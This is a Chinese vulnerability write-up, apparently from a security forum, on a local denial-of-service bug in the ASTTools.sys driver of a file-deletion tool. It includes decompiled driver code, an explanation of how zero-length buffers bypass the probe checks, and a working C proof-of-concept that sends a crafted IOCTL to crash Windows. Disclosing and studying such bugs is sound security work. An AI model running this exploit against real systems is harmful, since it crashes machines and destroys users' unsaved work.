
# 超级巡警暴力文件删除工具 1.4 ASTTools.sys 本地拒绝服务漏洞

> 原文：[`www.pediy.com/kssd/pediy11/117481.html`](https://www.pediy.com/kssd/pediy11/117481.html)

## 基本信息

产品版本：超级巡警暴力文件删除工具 1.4  
文件版本：`ASTTools.sys` CheckSum：00013546

## 问题描述

`IRP_MJ_DEVICE_CONTROL` 处理例程存在本地拒绝服务漏洞  
使用 `METHOD_NEITHER` 方式传递数据,没有对缓冲区进行严格的检查，就进行使用

## 关键代码

```
if(IoControlCode == 0x50000407)
{
    v10 = UserBuf;
    ProbeForRead((const void *)UserBuf, InputBufferLength, 1u);
    ProbeForWrite((PVOID)UserBuf, OutputBufferLength, 1u);
    RtlInitUnicodeString(&DestinationString, (PCWSTR)UserBuf);  //触发异常
    ........
}
```

虽然程序有使用 `ProbeForRead` 和 `ProbeForWrite` 来检查缓冲区的正确性  
但可惜的是;`ProbeForRead` 和 `ProbeForWrite` 是可以绕过的，即给 `InputBufferLength` 和 `OutputBufferLength` 填 0，就会不做检查了。

如果驱动开发者在留心一下，在自己的程序里对 `InputBufferLength` 和 `OutputBufferLength` 参数做检查，禁止 0 长度的 buffer,也可以避免此问题，可惜依然没有！

最终造成了这个本地拒绝服务漏洞;

## 测试代码

```
int main(int argc, char* argv[])
{
printf("FileForceKiller 0day 利用程序\n");
printf("本程序会导致蓝屏,请保存好数据\n");
printf("按下回车键激活 0day\n");
getchar();

HANDLE handle =CreateFileA("\\\\.\\ASTTools",0,FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0);
printf("%d\n",handle);
ULONG temp;
printf("%d",DeviceIoControl(handle,0x50000407,0,0,(PVOID)0x80000000,0,&temp,0));
//OutputBuffer 传 0x80000000,这是一个无效内核地址，被读取即会立即蓝屏

//InputBufferLength 跟 OutputBufferLength 传 0，这样可以绕过 ProbeForRead 和 ProbeForWrite 的检查！
getchar();
return 0 ;
}
```

以上代码就可以触发蓝屏

## 参考

参考(抄袭)地址：  
http://hi.baidu.com/mj0011/blog/item/58b9367f2fcc870d29388a3d.html

## 感言

在 MJ 的博客里面逛一圈可以学不少好东西哈;  
此文章多处地方参考(抄袭)了 MJ 博客里面的文章,希望 MJ 大大不要见怪  
另外要在这里特别感谢群里的大大,紫色秋枫,......在这方面对我的指导  
小弟我初学 0DAY，文章中如有错误之处，希望各位大大们及时指出,  
另外各位大大们别喷我，我只是个菜鸟
